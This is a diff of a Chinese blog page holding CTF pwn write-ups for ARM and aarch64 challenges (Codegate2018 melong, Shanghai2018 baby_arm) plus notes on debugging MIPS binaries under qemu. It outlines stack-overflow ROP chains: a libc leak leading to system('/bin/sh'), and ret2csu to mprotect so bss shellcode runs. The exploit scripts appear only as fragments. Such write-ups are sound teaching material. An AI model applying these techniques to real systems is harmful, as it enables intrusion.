@@ -974,17 +920,15 @@ pwndbg&gt; cyclic -l 0x62616164
         <span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
         <span class="k">continue</span>
     <span class="k">else</span><span class="p">:</span>
-        <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></td></tr></table>
+        <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<h2 id="codegate2018-melong">Codegate2018 - melong</h2>
-
+</div><h2 id="codegate2018---melong">Codegate2018 - melong</h2>
 <p><a href="https://github.com/bash-c/pwn_repo/tree/master/Codegate2018_Melong">题目和脚本链接</a></p>
-
 <h3 id="静态分析-1">静态分析</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -993,25 +937,22 @@ pwndbg&gt; cyclic -l 0x62616164
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">melong: ELF <span class="m">32</span>-bit LSB executable, ARM, EABI5 version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-linux.so.3, <span class="k">for</span> GNU/Linux <span class="m">3</span>.2.0, BuildID<span class="o">[</span>sha1<span class="o">]=</span>2c55e75a072020303e7c802d32a5b82432f329e9, not stripped
+<pre class="chroma"><code class="language-bash" data-lang="bash">melong: ELF 32-bit LSB executable, ARM, EABI5 version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-linux.so.3, <span class="k">for</span> GNU/Linux 3.2.0, BuildID<span class="o">[</span>sha1<span class="o">]=</span>2c55e75a072020303e7c802d32a5b82432f329e9, not stripped
 <span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/m4x/pwn_repo/Codegate2018_Melong/melong&#39;</span>
     Arch:     arm-32-little
     RELRO:    Partial RELRO
     Stack:    No canary found
     NX:       NX enabled
-    PIE:      No PIE</code></pre></td></tr></table>
+    PIE:      No PIE
+</code></pre></td></tr></table>
 </div>
-</div>
-<h3 id="思路分析">思路分析</h3>
-
-<p>程序逻辑很简单, 就不写分析过程了, 漏洞很好找, write_diary 中 read 的长度是由我们输入的, 可以栈溢出, 先进入 PT 函数, 输入 -1, 再进入 write_diary, 就可以实现 arbitrary overflow 了, 因此思路同 x64 下的 rop 相同, 先 leak 出 libc 基址, 然后控制执行 system(&ldquo;/bin/sh&rdquo;) 即可</p>
-
+</div><h3 id="思路分析">思路分析</h3>
+<p>程序逻辑很简单, 就不写分析过程了, 漏洞很好找, write_diary 中 read 的长度是由我们输入的, 可以栈溢出, 先进入 PT 函数, 输入 -1, 再进入 write_diary, 就可以实现 arbitrary overflow 了, 因此思路同 x64 下的 rop 相同, 先 leak 出 libc 基址, 然后控制执行 system(&quot;/bin/sh&quot;) 即可</p>
 <p><strong>比赛时这道题目并没有给 libc 文件, 为了简化演示过程, 我直接用了我本地的 libc</strong></p>
-
 <h3 id="exp">exp</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1136,19 +1077,16 @@ pwndbg&gt; cyclic -l 0x62616164
     <span class="n">write_diray</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span>
     <span class="n">logout</span><span class="p">()</span>
 
-    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></td></tr></table>
+    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<h2 id="shanghai2018-baby-arm">Shanghai2018 - baby_arm</h2>
-
+</div><h2 id="shanghai2018---baby_arm">Shanghai2018 - baby_arm</h2>
 <p><a href="https://github.com/bash-c/pwn_repo/tree/master/Shanghai2018_baby_arm">binary &amp; exploit here</a></p>
-
 <h3 id="静态分析-2">静态分析</h3>
-
 <p>题目给了一个 <code>aarch64</code> 架构的文件，没有开 canary 保护</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1162,20 +1100,20 @@ pwndbg&gt; cyclic -l 0x62616164
 <td class="lntd">
 <pre class="chroma"><code class="language-bash" data-lang="bash">Shanghai2018_baby_arm <span class="o">[</span>master<span class="o">]</span> check ./pwn 
 + file ./pwn
-./pwn: ELF <span class="m">64</span>-bit LSB executable, ARM aarch64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, <span class="k">for</span> GNU/Linux <span class="m">3</span>.7.0, BuildID<span class="o">[</span>sha1<span class="o">]=</span>e988eaee79fd41139699d813eac0c375dbddba43, stripped
+./pwn: ELF 64-bit LSB executable, ARM aarch64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, <span class="k">for</span> GNU/Linux 3.7.0, BuildID<span class="o">[</span>sha1<span class="o">]=</span>e988eaee79fd41139699d813eac0c375dbddba43, stripped
 + checksec ./pwn
 <span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/m4x/pwn_repo/Shanghai2018_baby_arm/pwn&#39;</span>
     Arch:     aarch64-64-little
     RELRO:    Partial RELRO
     Stack:    No canary found
     NX:       NX enabled
-    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span></code></pre></td></tr></table>
+    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>看一下程序逻辑</p>
+</div><p>看一下程序逻辑</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1206,17 +1144,15 @@ pwndbg&gt; cyclic -l 0x62616164
   <span class="kr">__int64</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// [xsp+10h] [xbp+10h]
 </span><span class="c1"></span>
   <span class="n">read</span><span class="p">(</span><span class="mi">0LL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v0</span><span class="p">,</span> <span class="mi">512LL</span><span class="p">);</span>
-<span class="p">}</span></code></pre></td></tr></table>
+<span class="p">}</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>程序的主干读取了 512 个字符到一个全局变量上，而在 <code>sub_4007F0()</code> 中，又读取了 512 个字节到栈上，需要注意的是这里直接从 <code>frame pointer + 0x10</code> 开始读取，因此即使开了 canary 保护也无所谓。</p>
-
+</div><p>程序的主干读取了 512 个字符到一个全局变量上，而在 <code>sub_4007F0()</code> 中，又读取了 512 个字节到栈上，需要注意的是这里直接从 <code>frame pointer + 0x10</code> 开始读取，因此即使开了 canary 保护也无所谓。</p>
 <h3 id="思路-1">思路</h3>
-
 <p>理一下思路，可以直接 rop，但我们不知道远程的 libc 版本，同时也发现程序中有调用 <code>mprotect</code> 的代码段</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-assembly" data-lang="assembly"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1228,7 +1164,7 @@ pwndbg&gt; cyclic -l 0x62616164
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-assembly" data-lang="assembly">.text:00000000004007C8                 STP             X29, X30, [SP,#-0x10]!
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">.text:00000000004007C8                 STP             X29, X30, [SP,#-0x10]!
 .text:00000000004007CC                 MOV             X29, SP
 .text:00000000004007D0                 MOV             W2, #0
 .text:00000000004007D4                 MOV             X1, #0x1000
@@ -1237,23 +1173,20 @@ pwndbg&gt; cyclic -l 0x62616164
 .text:00000000004007E0                 BL              .mprotect
 .text:00000000004007E4                 NOP
 .text:00000000004007E8                 LDP             X29, X30, [SP],#0x10
-.text:00000000004007EC                 RET</code></pre></td></tr></table>
+.text:00000000004007EC                 RET
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>但这段代码把 <code>mprotect</code> 的权限位设成了 0，没有可执行权限，这就需要我们通过 rop 控制 <code>mprotect</code> 设置如 bss 段等的权限为可写可执行</p>
-
+</div><p>但这段代码把 <code>mprotect</code> 的权限位设成了 0，没有可执行权限，这就需要我们通过 rop 控制 <code>mprotect</code> 设置如 bss 段等的权限为可写可执行</p>
 <p>因此可以有如下思路：</p>
-
 <ol>
 <li>第一次输入 name 时，在 bss 段写上 shellcode</li>
 <li>通过 rop 调用 mprotect 改变 bss 的权限</li>
 <li>返回到 bss 上的 shellcode</li>
 </ol>
-
 <p><code>mprotect</code> 需要控制三个参数，可以考虑使用 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium_rop/#ret2csu">ret2csu</a> 这种方法，可以找到如下的 gadgets 来控制 <code>x0, x1, x2</code> 寄存器</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-assembly" data-lang="assembly"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1270,7 +1203,7 @@ pwndbg&gt; cyclic -l 0x62616164
 </span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-assembly" data-lang="assembly">.text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">.text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]
 .text:00000000004008B0                 MOV             X2, X22
 .text:00000000004008B4                 MOV             X1, X23
 .text:00000000004008B8                 MOV             W0, W24
@@ -1284,13 +1217,13 @@ pwndbg&gt; cyclic -l 0x62616164
 .text:00000000004008D0                 LDP             X21, X22, [SP,#var_s20]
 .text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]
 .text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40
-.text:00000000004008DC                 RET</code></pre></td></tr></table>
+.text:00000000004008DC                 RET
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>最终的 <a href="https://github.com/bash-c/pwn_repo/blob/master/Shanghai2018_baby_arm/solve.py">exp</a> 如下：</p>
+</div><p>最终的 <a href="https://github.com/bash-c/pwn_repo/blob/master/Shanghai2018_baby_arm/solve.py">exp</a> 如下：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1391,43 +1324,42 @@ pwndbg&gt; cyclic -l 0x62616164
     <span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
     <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
-    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></td></tr></table>
+    <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<h3 id="notice">notice</h3>
-
+</div><h3 id="notice">notice</h3>
 <p>同时需要注意的是，<code>checksec</code> 检测的结果是开了 nx 保护，但这样检测的结果不一定准确，因为程序的 nx 保护也可以通过 qemu 启动时的参数 <code>-nx</code> 来决定（比如这道题目就可以通过远程失败时的报错发现程序开了 nx 保护），老版的 qemu 可能没有这个参数。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
 <pre class="chroma"><code class="language-bash" data-lang="bash">Desktop ./qemu-aarch64 --version
-qemu-aarch64 version <span class="m">2</span>.7.0, Copyright <span class="o">(</span>c<span class="o">)</span> <span class="m">2003</span>-2016 Fabrice Bellard and the QEMU Project developers
+qemu-aarch64 version 2.7.0, Copyright <span class="o">(</span>c<span class="o">)</span> 2003-2016 Fabrice Bellard and the QEMU Project developers
 Desktop ./qemu-aarch64 -h<span class="p">|</span> grep nx
--nx           QEMU_NX           <span class="nb">enable</span> NX implementation</code></pre></td></tr></table>
+-nx           QEMU_NX           <span class="nb">enable</span> NX implementation
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>如果有如下的报错，说明没有 aarch64 的汇编器</p>
+</div><p>如果有如下的报错，说明没有 aarch64 的汇编器</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>ERROR<span class="o">]</span> Could not find <span class="s1">&#39;as&#39;</span> installed <span class="k">for</span> ContextType<span class="o">(</span><span class="nv">arch</span> <span class="o">=</span> <span class="s1">&#39;aarch64&#39;</span>, <span class="nv">binary</span> <span class="o">=</span> ELF<span class="o">(</span><span class="s1">&#39;/home/m4x/Projects/ctf-challenges/pwn/arm/Shanghai2018_baby_arm/pwn&#39;</span><span class="o">)</span>, <span class="nv">bits</span> <span class="o">=</span> <span class="m">64</span>, <span class="nv">endian</span> <span class="o">=</span> <span class="s1">&#39;little&#39;</span>, <span class="nv">log_level</span> <span class="o">=</span> <span class="m">10</span><span class="o">)</span>
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="o">[</span>ERROR<span class="o">]</span> Could not find <span class="s1">&#39;as&#39;</span> installed <span class="k">for</span> ContextType<span class="o">(</span><span class="nv">arch</span> <span class="o">=</span> <span class="s1">&#39;aarch64&#39;</span>, <span class="nv">binary</span> <span class="o">=</span> ELF<span class="o">(</span><span class="s1">&#39;/home/m4x/Projects/ctf-challenges/pwn/arm/Shanghai2018_baby_arm/pwn&#39;</span><span class="o">)</span>, <span class="nv">bits</span> <span class="o">=</span> 64, <span class="nv">endian</span> <span class="o">=</span> <span class="s1">&#39;little&#39;</span>, <span class="nv">log_level</span> <span class="o">=</span> 10<span class="o">)</span>
     Try installing binutils <span class="k">for</span> this architecture:
-    https://docs.pwntools.com/en/stable/install/binutils.html</code></pre></td></tr></table>
+    https://docs.pwntools.com/en/stable/install/binutils.html
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>可以参考官方文档的解决方案</p>
+</div><p>可以参考官方文档的解决方案</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1440,30 +1372,26 @@ p   binutils-aarch64-linux-gnu                                         - GNU bin
 p   binutils-aarch64-linux-gnu:i386                                    - GNU binary utilities, <span class="k">for</span> aarch64-linux-gnu target                           
 p   binutils-aarch64-linux-gnu-dbg                                     - GNU binary utilities, <span class="k">for</span> aarch64-linux-gnu target <span class="o">(</span>debug symbols<span class="o">)</span>           
 p   binutils-aarch64-linux-gnu-dbg:i386                                - GNU binary utilities, <span class="k">for</span> aarch64-linux-gnu target <span class="o">(</span>debug symbols<span class="o">)</span>     
-Shanghai2018_baby_arm <span class="o">[</span>master●<span class="o">]</span> sudo apt install bintuils-aarch64-linux-gnu</code></pre></td></tr></table>
+Shanghai2018_baby_arm <span class="o">[</span>master●<span class="o">]</span> sudo apt install bintuils-aarch64-linux-gnu
+</code></pre></td></tr></table>
 </div>
-</div>
-<blockquote>
+</div><blockquote>
 <p>aarch64 的文件在装 libc 时是 <code>arm64</code>，在装 <code>binutils</code> 时是 <code>aarch64</code></p>
 </blockquote>
-
 <h2 id="more-1">More</h2>
-
 <ul>
 <li>libc_datebase for arm?</li>
 <li>如何多快好省的分析 strip 后的程序
-
 <ul>
 <li>后来了解到，对于静态编译的 bianry， 可以使用 lscan, flirt, rizzo, bindiff 等多种方法恢复部分符号表</li>
-</ul></li>
 </ul>
-
+</li>
+</ul>
 <h2 id="后记">后记</h2>
-
 <p>后来遇到 pwnable.kr 的 mipstake 这道题目，发现用以前的方法不能运行了</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1488,8 +1416,8 @@ pwnable_mipstake <span class="o">[</span>master●●<span class="o">]</span> ba
 ───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────
        │ File: run.sh
 ───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────
-   <span class="m">1</span>   │ <span class="cp">#!/usr/bin/env bash
-</span><span class="cp"></span>   <span class="m">2</span>   │ <span class="nb">set</span> -euxo pipefail
+   <span class="m">1</span>   │ <span class="c1">#!/usr/bin/env bash</span>
+   <span class="m">2</span>   │ <span class="nb">set</span> -euxo pipefail
    <span class="m">3</span>   │ 
    <span class="m">4</span>   │ <span class="nb">unset</span> LD_LIBRARY_PATH
    <span class="m">5</span>   │ qemu-mips -L ./ ./mipstake
@@ -1498,19 +1426,17 @@ pwnable_mipstake <span class="o">[</span>master●●<span class="o">]</span> ./
 + <span class="nb">unset</span> LD_LIBRARY_PATH
 + qemu-mips -L ./ ./mipstake
 qemu: uncaught target signal <span class="m">11</span> <span class="o">(</span>Segmentation fault<span class="o">)</span> - core dumped
-./run.sh: 行 <span class="m">5</span>: <span class="m">14538</span> 段错误               qemu-mips -L ./ ./mipstake</code></pre></td></tr></table>
+./run.sh: 行 5: <span class="m">14538</span> 段错误               qemu-mips -L ./ ./mipstake
+</code></pre></td></tr></table>
 </div>
-</div>
-<blockquote>
+</div><blockquote>
 <p>把 ld.so, libc.so 放到同一目录下而不是使用 <code>-L /usr/mips-linux-gnu/</code>，可以让 gdb-multiarch 在调试时更清楚的识别对应的地址是什么文件而不只是显示一个 <code>[linker]</code>。这是在和 <a href="http://myhackerworld.top/2018/10/22/HITCON-CTF-2018-tooooo/">D4rk3r</a> 师傅讨论一道题目的时候偶然发现的。</p>
 </blockquote>
-
 <p>但 <code>ld.so.1</code>，<code>libc.so.6</code> 在我本地又是可以运行的，说明不是 libc 版本的问题。</p>
-
 <p>用 <code>strace</code> 跟踪一下</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1534,18 +1460,18 @@ pwnable_mipstake <span class="o">[</span>master●●<span class="o">]</span> qe
 <span class="m">14911</span> access<span class="o">(</span><span class="s2">&#34;/etc/ld.so.nohwcap&#34;</span>,F_OK<span class="o">)</span> <span class="o">=</span> -1 <span class="nv">errno</span><span class="o">=</span><span class="m">2</span> <span class="o">(</span>No such file or directory<span class="o">)</span>
 <span class="m">14911</span> access<span class="o">(</span><span class="s2">&#34;/etc/ld.so.preload&#34;</span>,R_OK<span class="o">)</span> <span class="o">=</span> -1 <span class="nv">errno</span><span class="o">=</span><span class="m">2</span> <span class="o">(</span>No such file or directory<span class="o">)</span>
 <span class="m">14911</span> openat<span class="o">(</span>AT_FDCWD,<span class="s2">&#34;/etc/ld.so.cache&#34;</span>,O_RDONLY<span class="p">|</span>O_CLOEXEC<span class="o">)</span> <span class="o">=</span> <span class="m">3</span>
-<span class="m">14911</span> fstat64<span class="o">(</span><span class="m">3</span>,0x7fffe718<span class="o">)</span> <span class="o">=</span> <span class="m">0</span>
+<span class="m">14911</span> fstat64<span class="o">(</span>3,0x7fffe718<span class="o">)</span> <span class="o">=</span> <span class="m">0</span>
 <span class="m">14911</span> mmap2<span class="o">(</span>NULL,148329,PROT_READ,MAP_PRIVATE,3,0<span class="o">)</span> <span class="o">=</span> 0x7f7a3000
-<span class="m">14911</span> close<span class="o">(</span><span class="m">3</span><span class="o">)</span> <span class="o">=</span> <span class="m">0</span>
---- SIGSEGV <span class="o">{</span><span class="nv">si_signo</span><span class="o">=</span>SIGSEGV, <span class="nv">si_code</span><span class="o">=</span><span class="m">1</span>, <span class="nv">si_addr</span><span class="o">=</span>0xcf9e3008<span class="o">}</span> ---
+<span class="m">14911</span> close<span class="o">(</span>3<span class="o">)</span> <span class="o">=</span> <span class="m">0</span>
+--- SIGSEGV <span class="o">{</span><span class="nv">si_signo</span><span class="o">=</span>SIGSEGV, <span class="nv">si_code</span><span class="o">=</span>1, <span class="nv">si_addr</span><span class="o">=</span>0xcf9e3008<span class="o">}</span> ---
 qemu: uncaught target signal <span class="m">11</span> <span class="o">(</span>Segmentation fault<span class="o">)</span> - core dumped
-<span class="o">[</span><span class="m">1</span><span class="o">]</span>    <span class="m">14911</span> segmentation fault  qemu-mips -strace -L ./ ./mipstake</code></pre></td></tr></table>
+<span class="o">[</span>1<span class="o">]</span>    <span class="m">14911</span> segmentation fault  qemu-mips -strace -L ./ ./mipstake
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>发现了问题，<code>/etc/ld.so.nohwacap</code>，<code>/etc/ld.so.preload</code> 这些文件不存在（原因可能是因为只用包管理装了对应 arch 的 libc 而没有其他信息）</p>
+</div><p>发现了问题，<code>/etc/ld.so.nohwacap</code>，<code>/etc/ld.so.preload</code> 这些文件不存在（原因可能是因为只用包管理装了对应 arch 的 libc 而没有其他信息）</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt">1
+<pre class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -1554,21 +1480,18 @@ qemu: uncaught target signal <span class="m">11</span> <span class="o">(</span>S
 <pre class="chroma"><code class="language-bash" data-lang="bash">pwnable_mipstake <span class="o">[</span>master●●<span class="o">]</span> ls /usr/mips-linux-gnu 
 lib
 
-<span class="c1"># 没有 etc 这个目录</span></code></pre></td></tr></table>
+<span class="c1"># 没有 etc 这个目录</span>
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>那么 <code>/etc/ld.so.nohwacap</code> 这些文件是什么作用呢？google 了一下，发现大概就是和 <code>LD_PRELOAD</code> 一个作用</p>
-
+</div><p>那么 <code>/etc/ld.so.nohwacap</code> 这些文件是什么作用呢？google 了一下，发现大概就是和 <code>LD_PRELOAD</code> 一个作用</p>
 <blockquote>
 <p><a href="https://superuser.com/a/1183252/960572">https://superuser.com/a/1183252/960572</a></p>
 </blockquote>
-
 <p>但知道了原因，不知道要怎么解决。。。刚开始是想看看有没有什么包能安装其他 arch 的 <code>/etc/ld.so.preload</code> 这些文件，但找了一圈没找到（如果有师傅有这样的解决方法请务必指教）。</p>
-
 <p>后来偶然搜索到了这部分的 <a href="https://code.woboq.org/userspace/glibc/elf/rtld.c.html#1606">源码</a></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1588,9 +1511,9 @@ lib
 </span><span class="lnt">18
 </span><span class="lnt">19
 </span><span class="lnt">20
-</span></pre></td>
+</span></code></pre></td>
 <td class="lntd">
-<pre class="chroma">  /* We have two ways to specify objects to preload: via environment
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">  /* We have two ways to specify objects to preload: via environment
      variable and via the file /etc/ld.so.preload.  The latter can also
      be used when security is enabled.  */
   assert (*first_preload == NULL);
@@ -1609,15 +1532,14 @@ lib
      fail.  Using access() on a non-existing file is faster than using
      open().  So we do this first.  If it succeeds we do almost twice
      the work but this does not matter, since it is not for production
-     use.  */</pre></td></tr></table>
+     use.  */
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>从注释找到了解决方案，没有 <code>/etc/ld.so.preload</code>，我们还可以更改 <code>LD_PRELAOD</code> 这个环境变量。</p>
-
+</div><p>从注释找到了解决方案，没有 <code>/etc/ld.so.preload</code>，我们还可以更改 <code>LD_PRELAOD</code> 这个环境变量。</p>
 <p>修改一下运行脚本</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
+<pre class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -1640,8 +1562,8 @@ lib
 ───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────
        │ File: run.sh
 ───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────
-   <span class="m">1</span>   │ <span class="cp">#!/usr/bin/env bash
-</span><span class="cp"></span>   <span class="m">2</span>   │ <span class="nb">set</span> -euxo pipefail
+   <span class="m">1</span>   │ <span class="c1">#!/usr/bin/env bash</span>
+   <span class="m">2</span>   │ <span class="nb">set</span> -euxo pipefail
    <span class="m">3</span>   │ 
    <span class="m">4</span>   │ <span class="nv">LD_PRELOAD</span><span class="o">=</span><span class="s2">&#34;./lib/libc.so.6&#34;</span> <span class="s2">&#34;./lib/ld.so.1&#34;</span> <span class="s2">&#34;./mipstake&#34;</span>
    <span class="m">5</span>   │ qemu-mips ./mipstake
@@ -1652,45 +1574,30 @@ pwnable_mipstake <span class="o">[</span>master●●<span class="o">]</span> ./
 ERROR: ld.so: object <span class="s1">&#39;./lib/libc.so.6&#39;</span> from LD_PRELOAD cannot be preloaded <span class="o">(</span>wrong ELF class: ELFCLASS32<span class="o">)</span>: ignored.
 no need to brute-force..
 listening...
-^C</code></pre></td></tr></table>
+^C
+</code></pre></td></tr></table>
 </div>
-</div>
-<p>终于可以正常运行了，虽然还有报错，但只是 64 位系统和 32 位 libc 的兼容问题，影响不大。</p>
-
+</div><p>终于可以正常运行了，虽然还有报错，但只是 64 位系统和 32 位 libc 的兼容问题，影响不大。</p>
 <h2 id="last">Last</h2>
-
 <p>后来又发现只用 user mode 的 qemu 来模拟还是有很多缺陷的。。。像 gdb-multriarch 莫名跑飞或者甚至文件都不能运行。踩了很多次坑后有如下发现：</p>
-
 <ol>
 <li>可以使用 docker，推荐 <code>skysider/multiarch-docker</code>。大部分的问题应该都能解决了</li>
 <li>如果再调试时有问题，可以试下不用 gdb plugin，有些插件对异架构的识别效果并不好</li>
 <li>如果还有问题，那就只能用系统级的 qemu 来模拟了，推荐一片 <a href="https://www.ringzerolabs.com/2018/03/the-wonderful-world-of-mips.html">文章</a></li>
 </ol>
-
 <p>如上边链接中所说</p>
-
 <blockquote>
 <p>MIPS system is generally the most effective method of debugging as you do not have to deal with the process being emulated inside of an x86 QEMU User Mode process.</p>
 </blockquote>
-
 <p>本文将不再更新(除非遇到很让人眼前一亮的方法)，但欢迎私下交流和介绍经验:)</p>
-
 <h2 id="reference-1">Reference</h2>
-
 <p><a href="https://elixir.bootlin.com/linux/v2.6.32.51/source/arch/arm/include/asm/unistd.h">https://elixir.bootlin.com/linux/v2.6.32.51/source/arch/arm/include/asm/unistd.h</a></p>
-
 <p><a href="https://bbs.pediy.com/thread-224583.htm">https://bbs.pediy.com/thread-224583.htm</a></p>
-
 <p><a href="https://courses.washington.edu/cp105/02_Exceptions/Calling%20Standard.html">https://courses.washington.edu/cp105/02_Exceptions/Calling%20Standard.html</a></p>
-
 <p><a href="http://hideroot.tistory.com/46">http://hideroot.tistory.com/46</a></p>
-
 <p><a href="http://www.freebuf.com/articles/terminal/134980.html">http://www.freebuf.com/articles/terminal/134980.html</a></p>
-
 <p><a href="https://code.woboq.org/userspace/glibc/elf/rtld.c.html#1606">https://code.woboq.org/userspace/glibc/elf/rtld.c.html#1606</a></p>
-
 <p><a href="https://superuser.com/a/1183252/960572">https://superuser.com/a/1183252/960572</a></p>
-
 <p><a href="https://www.ringzerolabs.com/2018/03/the-wonderful-world-of-mips.html">https://www.ringzerolabs.com/2018/03/the-wonderful-world-of-mips.html</a></p>
 
     </div>
@@ -1826,7 +1733,7 @@ listening...
     &copy;
     
        -
-    2019
+    2020
     <span class="heart">
       
       <i class="iconfont">
